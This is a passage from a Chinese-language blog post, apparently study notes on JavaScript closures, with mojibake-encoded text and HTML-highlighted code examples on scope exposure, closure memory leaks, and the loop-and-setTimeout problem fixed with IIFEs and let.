å£°æ˜å’Œå‡½æ•°å£°æ˜æ··åˆåœ¨ä¸€èµ·çš„æ—¶å€™ï¼Œå¹¶ä¸”å£°æ˜ç›¸åŒæ—¶(varçš„å˜é‡åå’Œå‡½æ•°åç›¸åŒæ—¶ï¼‰ä¼šå¼•å‘jså¯¹é‡å¤å£°æ˜çš„å¿½ç•¥ã€‚ä¸€å®šè¦æ³¨æ„<strong>é¿å…é‡å¤å£°æ˜!</strong></li></ul><h2 id="ç¬¬äº”ç« -ä½œç”¨åŸŸé—­åŒ…"><a href="#ç¬¬äº”ç« -ä½œç”¨åŸŸé—­åŒ…" class="headerlink" title="ç¬¬äº”ç«  ä½œç”¨åŸŸé—­åŒ…"></a>ç¬¬äº”ç«  ä½œç”¨åŸŸé—­åŒ…</h2><h3 id="5-1-å¯ç¤º"><a href="#5-1-å¯ç¤º" class="headerlink" title="5.1 å¯ç¤º"></a>5.1 å¯ç¤º</h3><ul><li>JavaScriptä¸­é—­åŒ…æ— å¤„ä¸åœ¨ï¼Œä½ åªéœ€è¦èƒ½å¤Ÿè¯†åˆ«å¹¶æ‹¥æŠ±å®ƒã€‚</li><li>é—­åŒ…æ˜¯åŸºäºè¯æ³•ä½œç”¨åŸŸä¹¦å†™ä»£ç æ—¶æ‰€äº§ç”Ÿçš„è‡ªç„¶ç»“æœï¼Œç”šè‡³ä¸éœ€è¦ä¸ºäº†åˆ©ç”¨å®ƒä»¬è€Œæœ‰æ„è¯†åœ°åˆ›å»ºé—­åŒ…ã€‚</li></ul><h3 id="5-2-å®è´¨é—®é¢˜-amp-amp-5-3-ç°åœ¨æˆ‘æ‡‚äº†"><a href="#5-2-å®è´¨é—®é¢˜-amp-amp-5-3-ç°åœ¨æˆ‘æ‡‚äº†" class="headerlink" title="5.2 å®è´¨é—®é¢˜ &amp;&amp; 5.3 ç°åœ¨æˆ‘æ‡‚äº†"></a>5.2 å®è´¨é—®é¢˜ &amp;&amp; 5.3 ç°åœ¨æˆ‘æ‡‚äº†</h3><p><strong>ä»€ä¹ˆæ˜¯é—­åŒ…ï¼Ÿ(å¹¿ä¹‰ç‰ˆ)</strong>     </p><ul><li><strong>ä¹¦ä¸­è§£é‡Š:</strong> å½“å‡½æ•°å¯ä»¥è®°ä½å¹¶è®¿é—®æ‰€åœ¨çš„è¯æ³•ä½œç”¨åŸŸæ—¶ï¼Œå°±äº§ç”Ÿäº†é—­åŒ…ï¼Œå³ä½¿å‡½æ•°æ˜¯åœ¨å½“å‰è¯æ³•ä½œç”¨åŸŸä¹‹å¤–æ‰§è¡Œã€‚     </li><li><strong>MDNè§£é‡Š:</strong> é—­åŒ…æ˜¯<strong>å‡½æ•°</strong>å’Œå£°æ˜è¯¥å‡½æ•°çš„<strong>è¯æ³•ç¯å¢ƒ</strong>çš„ç»„åˆã€‚     </li><li><strong>æç®€ç‰ˆï¼š</strong>JavaScriptä¸­çš„å‡½æ•°å°±ä¼šå½¢æˆé—­åŒ…ã€‚     </li></ul><p><strong>æˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨æ—¶æ‰€è¯´çš„é—­åŒ…(ç‹­ä¹‰ç‰ˆï¼Œä¸¥æ ¼æ„ä¹‰ä¸Šçš„):</strong><br>ä¸ºäº†ä¾¿äºå¯¹é—­åŒ…ä½œç”¨åŸŸçš„è§‚å¯Ÿå’Œä½¿ç”¨ï¼Œæˆ‘ä»¬å®é™…ä½¿ç”¨æ—¶ä¼šå°†é—­åŒ…çš„å‡½æ•°ä½œç”¨åŸŸæš´éœ²ç»™å½“å‰è¯æ³•ä½œç”¨åŸŸä¹‹å¤–ï¼Œä¹Ÿå°±æ˜¯æœ¬ä¹¦ä¸€ç›´å¼ºè°ƒçš„<strong>é—­åŒ…å‡½æ•°éœ€è¦åœ¨å®ƒæœ¬èº«çš„è¯æ³•ä½œç”¨åŸŸä»¥å¤–æ‰§è¡Œ</strong>ã€‚ä½œè€…è®¤ä¸ºç¬¦åˆè¿™ä¸ªæ¡ä»¶æ‰ç§°å¾—ä¸Šæ˜¯çœŸæ­£çš„é—­åŒ…(ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨å¸¸è¯´çš„â€™ä½¿ç”¨é—­åŒ…â€™ï¼Œå¹¶ä¸”<strong>ä½¿ç”¨ä»»ä½•å›è°ƒå‡½æ•°å…¶å®ä¹Ÿæ˜¯é—­åŒ…</strong>).<br>æ‰€ä»¥ç‹­ä¹‰ç‰ˆå°±æ˜¯:<strong>é—­åŒ…æ˜¯å‡½æ•°å’Œå£°æ˜è¯¥å‡½æ•°çš„è¯æ³•ç¯å¢ƒçš„ç»„åˆï¼Œå¹¶ä¸”å°†é—­åŒ…çš„å‡½æ•°ä½œç”¨åŸŸæš´éœ²ç»™å½“å‰è¯æ³•ä½œç”¨åŸŸä¹‹å¤–.</strong>    </p><p><strong>é—­åŒ…æš´éœ²å‡½æ•°ä½œç”¨åŸŸçš„ä¸‰ç§æ–¹å¼:</strong>     </p><ul><li>é€šè¿‡å¤–éƒ¨å‡½æ•°çš„å‚æ•°è¿›è¡Œæš´éœ²</li></ul> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">   <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    baz(a) <span class="comment">//é€šè¿‡å¤–éƒ¨å‡½æ•°çš„å‚æ•°è¿›è¡Œæš´éœ²</span></span><br><span class="line">   &#125;</span><br><span class="line">   bar(); </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">baz</span>(<span class="params">val</span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log( val ); <span class="comment">// 2 </span></span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡å¤–éƒ¨ä½œç”¨åŸŸçš„å˜é‡è¿›è¡Œæš´éœ²</li></ul> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> val;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">   <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    val=a <span class="comment">//é€šè¿‡å¤–éƒ¨ä½œç”¨åŸŸçš„å˜é‡è¿›è¡Œæš´éœ²</span></span><br><span class="line">   &#125;</span><br><span class="line">   bar(); </span><br><span class="line">&#125;;</span><br><span class="line">foo();</span><br><span class="line"><span class="built_in">console</span>.log(val)  <span class="comment">//2</span></span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡returnç›´æ¥å°†æ•´ä¸ªå‡½æ•°è¿›è¡Œæš´éœ²</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">   <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> bar <span class="comment">//é€šè¿‡returnç›´æ¥å°†æ•´ä¸ªå‡½æ•°è¿›è¡Œæš´éœ²</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> val=foo();</span><br><span class="line">val()  <span class="comment">//2</span></span><br></pre></td></tr></table></figure><p><strong>å…³äºé—­åŒ…çš„å†…å­˜æ³„éœ²é—®é¢˜:</strong><br>é¦–å…ˆå¿…é¡»å£°æ˜ä¸€ç‚¹:<strong>ä½¿ç”¨é—­åŒ…å¹¶ä¸ä¸€å®šä¼šé€ æˆå†…å­˜æ³„éœ²ï¼Œåªæœ‰ä½¿ç”¨é—­åŒ…ä¸å½“æ‰å¯èƒ½ä¼šé€ æˆå†…å­˜æ³„éœ²ã€‚</strong><br>ä¸ºä»€ä¹ˆé—­åŒ…å¯èƒ½ä¼šé€ æˆå†…å­˜æ³„éœ²å‘¢ï¼ŸåŸå› å°±æ˜¯ä¸Šé¢æåˆ°çš„ï¼Œå› ä¸ºå®ƒä¸€èˆ¬ä¼š<strong>æš´éœ²è‡ªèº«çš„ä½œç”¨åŸŸ</strong>ç»™å¤–éƒ¨ä½¿ç”¨ã€‚å¦‚æœä½¿ç”¨ä¸å½“ï¼Œå°±å¯èƒ½å¯¼è‡´è¯¥å†…å­˜ä¸€ç›´è¢«å ç”¨ï¼Œæ— æ³•è¢«JSçš„åƒåœ¾å›æ”¶æœºåˆ¶å›æ”¶ï¼Œå°±é€ æˆäº†å†…å­˜æ³„éœ²ã€‚<br><strong>æ³¨æ„:</strong> <strong>å³ä½¿é—­åŒ…é‡Œé¢ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œé—­åŒ…ä»ç„¶ä¼šéšå¼åœ°å¼•ç”¨å®ƒæ‰€åœ¨ä½œç”¨åŸŸé‡Œçš„æ‰€ç”¨å˜é‡ã€‚</strong>   æ­£å› ä¸ºè¿™ä¸ªéšè—çš„ç‰¹ç‚¹ï¼Œé—­åŒ…ç»å¸¸ä¼šå‘ç”Ÿä¸æ˜“å‘ç°çš„å†…å­˜æ³„æ¼é—®é¢˜ã€‚<br><strong>å¸¸è§å“ªäº›æƒ…å†µä½¿ç”¨é—­åŒ…ä¼šé€ æˆå†…å­˜æ³„éœ²:</strong>    </p><ul><li>ä½¿ç”¨å®šæ—¶å™¨æœªåŠæ—¶æ¸…é™¤ã€‚å› ä¸ºè®¡æ—¶å™¨åªæœ‰å…ˆåœæ­¢æ‰ä¼šè¢«å›æ”¶ï¼Œæ‰€ä»¥åŠæ³•å¾ˆç®€å•ï¼Œå°†å®šæ—¶å™¨åŠæ—¶æ¸…é™¤ï¼Œå¹¶å°†é€ æˆå†…å­˜çš„å˜é‡èµ‹å€¼ä¸ºnull(å˜æˆç©ºæŒ‡é’ˆ)</li><li>ç›¸äº’å¾ªç¯å¼•ç”¨ã€‚è¿™æ˜¯ç»å¸¸å®¹æ˜“çŠ¯çš„é”™è¯¯ï¼Œå¹¶ä¸”ä¹Ÿä¸å®¹æ˜“å‘ç°.ä¸¾ä¸ªæ —å­:</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">var</span> a = &#123;&#125;; </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log(a); </span><br><span class="line">  &#125;; </span><br><span class="line">  a.fn = bar; </span><br><span class="line">  <span class="keyword">return</span> bar; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå½¢æˆäº†barå’Œaçš„ç›¸äº’å¾ªç¯å¼•ç”¨ã€‚å¯èƒ½æœ‰äººè¯´baré‡Œä¸ä½¿ç”¨<code>console.log(a)</code>ä¸å°±æ²¡æœ‰å¼•ç”¨äº†å—ï¼Ÿå°±ä¸ä¼šé€ æˆå†…å­˜æ³„éœ²äº†ã€‚NONONOï¼Œbarä½œä¸ºä¸€ä¸ªé—­åŒ…ï¼Œå³ä½¿å®ƒå†…éƒ¨ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œ<strong>fooä¸­çš„æ‰€æœ‰å˜é‡éƒ½è¿˜æ˜¯éšä½¿åœ°è¢« baræ‰€å¼•ç”¨</strong>ã€‚çœŸæ­£çš„è§£å†³åŠæ³•å°±æ˜¯ï¼Œä¸è¦å°†<code>a.fn = bar</code>.</p><ul><li>å°†é—­åŒ…å¼•ç”¨åˆ°å…¨å±€å˜é‡ä¸Šã€‚å› ä¸ºå…¨å±€å˜é‡æ˜¯åªæœ‰å½“é¡µé¢è¢«å…³é—­çš„æ—¶å€™æ‰ä¼šè¢«å›æ”¶ã€‚</li><li>åœ¨é—­åŒ…ä¸­å¯¹DOMè¿›è¡Œä¸å½“çš„å¼•ç”¨ã€‚è¿™ä¸ªå¸¸è§äºè€IEæµè§ˆå™¨ã€‚</li></ul><p>æ€»è€Œè¨€ä¹‹ï¼Œ<strong>è§£å†³åŠæ³•å°±æ˜¯ä½¿é—­åŒ…èƒ½æ­£å¸¸å¼•ç”¨ï¼Œèƒ½è¢«æ­£å¸¸å›æ”¶ã€‚å¦‚æœå®åœ¨ä¸è¡Œï¼Œå°±æ˜¯åœ¨ä½¿ç”¨å®Œåï¼Œæ‰‹åŠ¨å°†å˜é‡èµ‹å€¼nullï¼Œå¼ºè¡Œè¿›è¡Œåƒåœ¾å›æ”¶ã€‚</strong></p><h3 id="5-4-å¾ªç¯å’Œé—­åŒ…"><a href="#5-4-å¾ªç¯å’Œé—­åŒ…" class="headerlink" title="5.4 å¾ªç¯å’Œé—­åŒ…"></a>5.4 å¾ªç¯å’Œé—­åŒ…</h3><p>çœ‹å¦‚ä¸‹ä¾‹å­:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123; </span><br><span class="line">  <span class="built_in">setTimeout</span>( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log( i );</span><br><span class="line">  &#125;ï¼Œ i*<span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æœŸæœ›çš„ç»“æœæ˜¯åˆ†åˆ«è¾“å‡ºæ•°å­— 1~5ï¼Œæ¯ç§’ä¸€æ¬¡ï¼Œæ¯æ¬¡ä¸€ä¸ªã€‚ä½†å®é™…ç»“æœæ˜¯ï¼Œè¿™æ®µä»£ç åœ¨è¿è¡Œæ—¶ä¼šä»¥æ¯ç§’ä¸€æ¬¡çš„é¢‘ç‡è¾“å‡ºäº”æ¬¡ 6ã€‚<strong>ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ</strong>     </p><ul><li>timeræ¯«æ— ç–‘é—®æ˜¯ä¸€ä¸ªé—­åŒ…ï¼Œå®ƒå¯ä»¥è®¿é—®åˆ°å¤–éƒ¨çš„å˜é‡iã€‚</li><li>åœ¨è¿›è¡Œforå¾ªç¯æ—¶ï¼Œtimer()ä¼šè¢«é‡å¤æ‰§è¡Œ5æ¬¡ï¼Œä¹Ÿå°±æ˜¯å®ƒä¼š console.log( i )5æ¬¡ï¼Œè¿™5æ¬¡<code>i</code>å…¶å®æ˜¯<strong>åŒä¸€ä¸ª</strong><code>i</code>ï¼Œå®ƒæ˜¯æ¥è‡ªäºå¤–éƒ¨ä½œç”¨åŸŸï¼Œå³foré‡Œé¢å£°æ˜çš„iã€‚</li><li>åœ¨<strong>è¯æ³•ä½œç”¨åŸŸä¸­</strong>å˜é‡iåªå¯èƒ½å¯¹åº”ä¸€ä¸ªå”¯ä¸€çš„å€¼ï¼Œå³<strong>å˜é‡å’Œå®ƒçš„å€¼æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œä¸ä¼šå˜åŒ–</strong>ã€‚</li><li>é‚£è¿™ä¸ªå€¼åˆ°åº•æ˜¯å¤šå°‘å‘¢ï¼Ÿ<strong>è¿™ä¸ªå€¼å°±æ˜¯æœ€ç»ˆå€¼ï¼</strong> içš„æœ€ç»ˆå€¼æ˜¯6ï¼Œå³forå¾ªç¯å®Œå<code>i</code>çš„å€¼ã€‚</li><li>å½“å¼•æ“æ‰§è¡Œ<code>console.log( i )</code>æ—¶ï¼Œå®ƒä¼šè¯¢é—®iæ‰€å¯¹åº”çš„ä½œç”¨åŸŸï¼Œé—®å®ƒiçš„å€¼æ˜¯å¤šå°‘ã€‚è¿™ä¸ªæ—¶å€™ä½œç”¨åŸŸè¿›è¡ŒRHSæŸ¥è¯¢å¾—åˆ°çš„ç»“æœå°±æ˜¯æœ€ç»ˆå€¼6ã€‚        </li></ul><p><strong>ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¼šä»¥ä¸ºåˆ†åˆ«è¾“å‡º1~5ï¼Ÿ</strong>     </p><p>å› ä¸ºåœ¨forå¾ªç¯ä¸­ï¼Œæˆ‘ä»¬é”™ä»¥ä¸ºæ¯ä¸€æ¬¡å¾ªç¯æ—¶ï¼Œå‡½æ•°æ‰€è¾“å‡ºçš„iæ˜¯æ ¹æ®å¾ªç¯åŠ¨æ€å˜åŒ–çš„ï¼Œå³æ˜¯1~5ç´¯åŠ å˜åŒ–çš„ã€‚ä½†å®é™…ä¸Šå®ƒæ‰€è®¿é—®çš„iæ˜¯åŒä¸€ä¸ªå›ºå®šä¸å˜çš„å€¼ï¼Œå³æœ€ç»ˆå€¼6ã€‚å¯èƒ½ä½ ä¼šæœ‰è¿™æ ·çš„ç–‘æƒ‘ï¼Œé‚£æˆ‘å¾ªç¯è¿˜æœ‰æ„ä¹‰å—ï¼Ÿiå…¶å®ä¸€å¼€å§‹å°±ç¡®å®šæ˜¯6äº†.æ²¡æœ‰å˜åŒ–è¿‡ï¼é”™ï¼ <code>i</code>å˜åŒ–è¿‡ï¼Œå®ƒçš„ç¡®æ˜¯ä»1é€æ­¥å¢åŠ åˆ°6çš„ï¼Œåªæ˜¯å¤–éƒ¨ä½œç”¨åŸŸçš„iå€¼åªå¯èƒ½æ˜¯å¾ªç¯å®Œåçš„æœ€ç»ˆå€¼ï¼Œå¹¶ä¸”<strong>å‡½æ•°timer()å¹¶æ²¡æœ‰ä¿å­˜æ¯æ¬¡iå˜åŒ–çš„å€¼</strong>ï¼Œå®ƒåªæ˜¯è®¿é—®äº†å¤–éƒ¨ä½œç”¨åŸŸçš„iå€¼å³æœ€ç»ˆçš„å€¼6ã€‚ OKï¼Œæˆ‘ä»¬çŸ¥é“äº†å‡ºé”™çš„åœ°æ–¹ï¼Œå°±æ˜¯æˆ‘ä»¬<strong>æ²¡æœ‰æŠŠæ¯æ¬¡içš„å€¼ä¿å­˜åœ¨ä¸€ä¸ªç‹¬ç«‹çš„ä½œç”¨åŸŸä¸­ã€‚</strong><br>æ¥ä¸‹æ¥ï¼Œçœ‹ä¸‹è¿™ä¸ªæ”¹è¿›çš„ä¾‹å­ç»“æœæ˜¯å¤šå°‘.    </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123; </span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( i );</span><br><span class="line">    &#125;ï¼Œ i*<span class="number">1000</span> );</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒçš„æœ€ç»ˆå€¼ä»ç„¶æ˜¯5ä¸ª6ã€‚ä¸Šä¾‹ä¸­ï¼Œå®ƒç”¨äº†ä¸€ä¸ªåŒ¿åå‡½æ•°åŒ…è£¹äº†å®šæ—¶å™¨ï¼Œå¹¶ç«‹å³æ‰§è¡Œã€‚åœ¨è¿›è¡Œforå¾ªç¯æ—¶ï¼Œä¼šåˆ›é€ 5ä¸ªç‹¬ç«‹çš„å‡½æ•°ä½œç”¨åŸŸ(ç”±åŒ¿åå‡½æ•°åˆ›å»ºçš„ï¼Œå› ä¸ºå®ƒæ˜¯é—­åŒ…å‡½æ•°)ã€‚ä½†æ˜¯è¿™5ä¸ªç‹¬ç«‹çš„å‡½æ•°ä½œç”¨åŸŸé‡Œçš„iä¹Ÿå…¨éƒ½æ˜¯å¯¹å¤–éƒ¨ä½œç”¨åŸŸçš„å¼•ç”¨ï¼Œå³å®ƒä»¬è®¿é—®çš„éƒ½æ˜¯içš„æœ€ç»ˆå€¼6ã€‚è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œæˆ‘ä»¬è¦çš„æ˜¯5ä¸ªç‹¬ç«‹çš„ä½œç”¨åŸŸï¼Œå¹¶ä¸”æ¯ä¸ªä½œç”¨åŸŸéƒ½ä¿å­˜ä¸€ä¸ªâ€å½“æ—¶â€<code>i</code>çš„å€¼ã€‚</p><p><strong>è§£å†³åŠæ³•:</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123; </span><br><span class="line">  (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> j =i;</span><br><span class="line">    <span class="built_in">setTimeout</span>( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( j );</span><br><span class="line">    &#125;ï¼Œ j*<span class="number">1000</span> );</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åˆ†åˆ«è¾“å‡ºæ•°å­— 1~5ï¼Œæ¯ç§’ä¸€ä¸ªã€‚</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·æ”¹å†™åï¼ŒåŒ¿åå‡½æ•°æ¯æ¬¡éƒ½é€šè¿‡jä¿å­˜äº†æ¯æ¬¡iå€¼ï¼Œè¿™æ ·<code>i</code>å€¼å°±<strong>é€šè¿‡jä¿å­˜åœ¨äº†ç‹¬ç«‹çš„ä½œç”¨åŸŸä¸­</strong>ã€‚æ³¨æ„æ­¤æ—¶ä¿å­˜çš„iå€¼æ˜¯â€™å½“æ—¶â€™çš„å€¼ï¼Œå¹¶ä¸æ˜¯å¾ªç¯å®Œåçš„æœ€ç»ˆå€¼ã€‚è¿™æ ·å¾ªç¯å®Œåï¼Œå®é™…ä¸Šå°±åˆ›å»ºäº†5ä¸ªç‹¬ç«‹çš„ä½œç”¨åŸŸï¼Œæ¯ä¸ªä½œç”¨åŸŸéƒ½ä¿å­˜äº†ä¸€ä¸ªâ€™å½“æ—¶â€™içš„å€¼(é€šè¿‡j)ã€‚å½“å¼•æ“æ‰§è¡Œ<code>console.log(j)</code>è¯¢é—®å…¶å¯¹åº”çš„ç‹¬ç«‹ä½œç”¨åŸŸæ—¶ï¼Œå¾—åˆ°çš„å€¼å°±æ˜¯â€™å½“æ—¶â€™ä¿å­˜çš„å€¼ã€‚<br>è¿˜å¯ä»¥è¿›ä¸€æ­¥ç®€å†™ä¸ºè¿™æ ·:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123; </span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params">j</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( j );</span><br><span class="line">    &#125;ï¼Œ j*<span class="number">1000</span> );</span><br><span class="line">  &#125;)(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ç»“æœä¸ä¸Šé¢ç›¸åŒ</span></span><br></pre></td></tr></table></figure><p><strong>åˆ©ç”¨å—ä½œç”¨åŸŸè¿›è¡Œè§£å†³:</strong><br>åœ¨es6ä¸­ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥ä½¿ç”¨å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„ä½œç”¨åŸŸï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨letå£°æ˜æ¥åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„å—ä½œç”¨åŸŸ(åœ¨<code>&#123;&#125;</code>å†…)ã€‚æ‰€ä»¥æˆ‘ä»¬è¿˜å¯ä»¥è¿™æ ·æ”¹å†™:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123; </span><br><span class="line">  <span class="built_in">setTimeout</span>( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log( i );</span><br><span class="line">  &#125;ï¼Œ i*<span class="number">1000</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ç»“æœä¸ä¸Šé¢ç›¸åŒ</span></span><br></pre></td></tr></table></figure><p>åœ¨æ¯æ¬¡å¾ªç¯æ—¶ï¼Œletéƒ½ä¼šå¯¹iè¿›è¡Œå£°æ˜ï¼Œå¹¶é€šè¿‡å¾ªç¯è‡ªå¸¦çš„<code>&#123;&#125;</code>åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„å—ä½œç”¨åŸŸã€‚å¹¶ä¸”letå£°æ˜çš„iï¼Œä¿å­˜äº†â€™å½“æ—¶â€™<code>i</code>çš„å€¼åœ¨å½“å‰å—ä½œç”¨åŸŸé‡Œï¼Œå› æ­¤å½“å¼•æ“æ‰§è¡Œ<code>console.log(i)</code>æ—¶ï¼Œå®ƒä¼šè¯¢é—®å¯¹åº”çš„å—ä½œç”¨åŸŸä¸Šiçš„å€¼ï¼Œå¾—åˆ°çš„ç»“æœå°±æ˜¯â€™å½“æ—¶â€™ä¿å­˜çš„å€¼ã€‚</p><p><strong>å»¶ä¼¸:</strong><br>å®é™…ä¸Šå—ä½œç”¨åŸŸå¯ä»¥ç§°å¾—ä¸Šä¸€ä¸ªâ€™ä¼ªâ€™é—­åŒ…(ä¹‹æ‰€ä»¥æ˜¯ä¼ªï¼Œæ˜¯å› ä¸ºé—­åŒ…è§„å®šäº†åªèƒ½æ˜¯å‡½æ•°)ã€‚å®ƒå‡ ä¹æ‹¥æœ‰é—­åŒ…çš„æ‰€æœ‰ç‰¹æ€§ï¼Œä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„ä½œç”¨åŸŸï¼ŒåŒæ ·å¤–éƒ¨ä½œç”¨åŸŸä¸èƒ½è®¿é—®å—ä½œç”¨åŸŸçš„å˜é‡ã€‚ä½†å—ä½œç”¨åŸŸå¯ä»¥è®¿é—®å¤–éƒ¨ä½œç”¨åŸŸï¼Œä¸¾ä¸ªæ —å­:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">  &#123;  <span class="comment">//é€šè¿‡&#123;&#125; æ˜¾ç¤ºè¡¨ç¤ºå—ä½œç”¨åŸŸ</span></span><br><span class="line">    <span class="keyword">let</span> b = a;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;å—ä½œç”¨åŸŸå†…&#x27;</span>ï¼Œb) <span class="comment">//2</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;å—ä½œç”¨åŸŸå¤–&#x27;</span>ï¼Œb) <span class="comment">//b is not defined</span></span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>è¯´è¯´ä¸åŒç‚¹:   </p><ol><li>ä¿å­˜å˜é‡åˆ°å—ä½œç”¨åŸŸï¼Œå¿…é¡»é€šè¿‡letå£°æ˜ã€‚</li><li>å—ä½œç”¨åŸŸä¸èƒ½å’Œå‡½æ•°ä¸€æ ·æœ‰åç§°(å‡½æ•°å)</li></ol><p>å¾ˆå¤šä¸æ–¹ä¾¿ä½¿ç”¨é—­åŒ…æˆ–è€…æ¯”è¾ƒéº»çƒ¦çš„æ—¶å€™ï¼Œå¯ä»¥è€ƒè™‘é€šè¿‡å—ä½œç”¨åŸŸè¿›è¡Œè§£å†³ã€‚</p><p><strong>æ€»ç»“ä¸€ä¸‹ä¸€èˆ¬ä»€ä¹ˆæ—¶å€™è€ƒè™‘ä½¿ç”¨é—­åŒ…:</strong>     </p><ol><li>éœ€è¦åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„ä½œç”¨åŸŸå¹¶éšè—ä¸€äº›å˜é‡æˆ–å‡½æ•°ï¼Œä¸è¢«å¤–éƒ¨ä½¿ç”¨ï¼›æˆ–è€…æƒ³ä¿å­˜ä¸€äº›å¤–éƒ¨ä½œç”¨åŸŸçš„å˜é‡æˆ–å‡½æ•°åˆ°è¿™ä¸ªç‹¬ç«‹ä½œç”¨åŸŸã€‚</li><li>åªæƒ³æš´éœ²<strong>ä¸€éƒ¨åˆ†</strong>è‡ªèº«ä½œç”¨åŸŸçš„å˜é‡æˆ–å‡½æ•°ç»™å¤–éƒ¨ä½¿ç”¨ã€‚</li></ol><h3 id="5-5-æ¨¡å—"><a href="#5-5-æ¨¡å—" class="headerlink" title="5.5 æ¨¡å—"></a>5.5 æ¨¡å—</h3><p>é¦–å…ˆçœ‹ä¸‹é¢çš„ä¾‹å­:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CoolModule</span>(<span 